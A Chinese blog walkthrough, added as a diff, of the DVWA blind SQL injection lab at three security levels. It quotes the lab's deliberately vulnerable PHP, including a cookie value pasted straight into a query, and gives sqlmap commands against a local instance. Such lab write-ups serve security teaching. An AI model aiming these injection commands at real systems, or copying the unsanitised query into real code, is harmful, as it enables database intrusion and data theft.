@@ -1,0 +1,38 @@
+# 链接(URL)：https://www.wuyini.cn/672.html
+
+
+SQL Injection (Blind) SQL 盲注
+盲注是一个比较耗时的工作，因为之前刷完靶场了，这里打算使用 sqlmap 演示一下点到为止，感兴趣的朋友建议去系统地刷下 SQLi-Labs 靶场。
+
+Low
+主要区别在这里：Php
+
+if( $num > 0 ) {
+  // 查询到结果 只输出如下信息
+  $html .= '<pre>User ID exists in the database.</pre>';
+}
+下面尝试直接使用 sqlmap 进行注入：Bash
+
+sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/?id=1*&Submit=Submit#" --cookie="PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=low" --dbms=MySQL --technique=B --random-agent --flush-session -v 3
+因为 DVWA 是有登录机制的，所以这里手动指定 –cookie 来进行会话认证
+
+Medium
+同理也是没有直接输出查询结果的，这里和普通的注入类似，那么这里依然还是直接使用 sqlmap 进行注入：Bash
+
+sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=medium" --data="id=1*&Submit=Submit" --dbms=MySQL --technique=B --random-agent --flush-session -v 3
+
+# 商业转载请联系作者获得授权，非商业转载请注明出处。
+# For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.
+# 协议(License)：署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)
+# 作者(Author)：无垠
+# 链接(URL)：https://www.wuyini.cn/672.html
+# 来源(Source)：
+
+High
+Php
+
+$id = $_COOKIE[ 'id' ];
+$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+这里是从 Cookie 中获取 id 然后倒入到数据库中查询的，那么知道注入点之后依然可以使用 sqlmap 来进行注入：Bash
+
+sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/" --cookie="id=1*; PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=high" --dbms=MySQL --technique=B --random-agent --flush-session -v 3
